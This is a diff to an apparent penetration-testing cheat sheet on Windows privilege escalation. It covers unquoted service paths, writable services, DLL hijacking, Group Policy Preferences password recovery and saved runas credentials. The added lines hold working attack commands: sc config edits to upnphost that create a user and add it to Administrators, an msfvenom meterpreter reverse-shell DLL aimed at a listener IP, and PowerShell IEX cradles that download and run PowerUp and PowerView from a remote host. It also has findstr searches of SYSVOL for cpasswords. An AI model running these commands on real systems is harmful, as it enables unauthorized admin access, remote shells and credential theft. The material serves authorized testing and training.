@@ -17,6 +17,7 @@
 - Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb
 
 ## Metasploit
+
 In 32bit systems:
 ```
 local_exploit_suggester
@@ -96,11 +97,23 @@ C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
 
 Insecure Setup:
 ```
-C:\Windows\System32>sc create "Vulnerable Service" binPath= "C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe" start=auto
-C:\Windows\System32>cd C:\Program Files (x86)
-C:\Program Files (x86)>mkdir "Program Folder\A Subfolder"
 C:\Program Files (x86)>icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T
+
+F = Full Control
+CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.
+OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE.
 ```
+```
+sc stop "Vulnerable Service"
+sc start "Vulnerable Service"
+
+OR
+
+shutdown /r /t 0
+```
+
+Need to migrate (auto-migration)
+
 ### Folder & Service Executable Privileges
 
 - When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\Authenticated Users:(I)(M))
@@ -124,7 +137,11 @@ CI = Container Inherit - This flag indicates that subordinate containers will in
 OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE.
 ```
 
-### Service Permissions
+```
+accesschk.exe -dqv "C:\" /accepteula
+```
+
+### Insecure Service Permissions
 
 - `exploit/windows/local/service_permissions`
 
@@ -146,6 +163,32 @@ sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin 
 #### Approach 2 - Check services a given user can edit
 ```
 accesschk.exe -uwcqv "testuser" *
+```
+
+```
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -uwcqv * /accepteula
+
+sc config upnphost binpath= "net user /add amxuser1 amxpass1234"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+net stop upnphost
+net start upnphost
+net start upnphost
+
+sc config upnphost binpath= "net localgroup administrators amxuser1 /add"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+net stop upnphost
+net start upnphost
+net start upnphost
+
+sc config upnphost binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+net stop upnphost
+net start upnphost
+net start upnphost
 ```
 
 ### AlwaysInstallElevated
@@ -207,11 +250,24 @@ The directories that are listed in the PATH environment variable.
 
 - Services running under SYSTEM does not search through user path environment.
 
+Example:
+```
+#include "stdafx.h"
+#include "windows.h"
+void _tmain(int argc, _TCHAR* argv[])
+{
+  LoadLibrary(L"hijackable.dll");
+}
+```
+
 Identify processes / services
 - Use procman (https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx).
     - Filter `Result` = `NAME NOT FOUND` and `Path` ends with `dll`
 - Look at the registry key `ServiceDll` of services (`Parameters`).
 
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll > hijackable.dll
+```
 #### Windows 7
 
 ```
@@ -354,15 +410,30 @@ C:\Windows\System32\sysprep\
 
 #### Group Policy Preferences (GPP)
 - Introduced from Windows Server 2008
+  - https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati
 - `GPP` allows for configuration of Domain-attached machines via `group policy`.
+  - Map drives (Drives.xml)
+  - Create Local Users
+  - Data Sources (DataSources.xml)
+  - Printer configuration (Printers.xml)
+  - Create/Update Services (Services.xml)
+  - Scheduled Tasks (ScheduledTasks.xml)
+  - Change local Administrator passwords
 - GPPs are stored in the `SYSVOL` share, which is world-readable to authenticated users.
+  - `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
+  - `findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml`
 - Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the `logged-in user` and pull down policies.
 - Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the `SYSVOL` folder (`\\Domain\SYSVOL\<DOMAIN>\Policies`)
 - `cpassword` is used to set passwords for the Local Administrator account.
 - Password is AES-256 encrypted using a published key: [https://msdn.microsoft.com/en-us/library/Cc422924.aspx](https://msdn.microsoft.com/en-us/library/Cc422924.aspx)
 - Metasploit: `post/windows/gather/credentials/gpp`
 - PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+  - Get-CachedGPPPassword //For locally stored GP Files
+  - Get-GPPPassword //For GP Files stored in the DC
 - `Get-DecryptedPassword` to decrypt the AES encryption
+- http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip
+
+https://pentestlab.blog/tag/cpassword/
 
 Decrypt encrypted password:
 ```
@@ -375,9 +446,16 @@ Get-NetOU -GUID "{4C86DD57-4040-41CD-B163-58F208A26623}" | %{ Get-NetComputer -A
 // All OUs connected to policy | List all domain machines tied to OU
 ```
 
+```
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.100.3/tmp/PowerUp.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.100.3/tmp/PowerView.ps1")
+
+Get-CachedGPPPassword
+```
+
 - Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899
 
-#### Defense 
+#### Defense
 
 - Prevent passwords from getting added to GPP (KB2962486) and delete existing GPP from SYSVOL containing passwords.
 - **[ALERTING]** Detect by setting Everyone:DENY on SYSVOL GPP file. (Logs: Audit access denied)
@@ -418,6 +496,10 @@ cmdkey /list
 Run a command as admin:
 ```
 runas /user:ACCESS\Administrator /savecred ​ "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')
+```
+
+```
+powershell.exe -Credential "TestDomain\Me" -NoNewWindow -ArgumentList "Start-Process powershell.exe -Verb runAs"
 ```
 
 Find all `runas` shortcuts:
@@ -499,13 +581,13 @@ KiTrap0d
 
 ###Privilege Attribute Certificate Data Structure (PAC)
 
-### Kerberos 
+### Kerberos
 
 #### Kerberos Protocol Extension (KILE)
 
 #### Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU)
 
-### 
+### Add user using service misconfiguration
 
 ## References
 
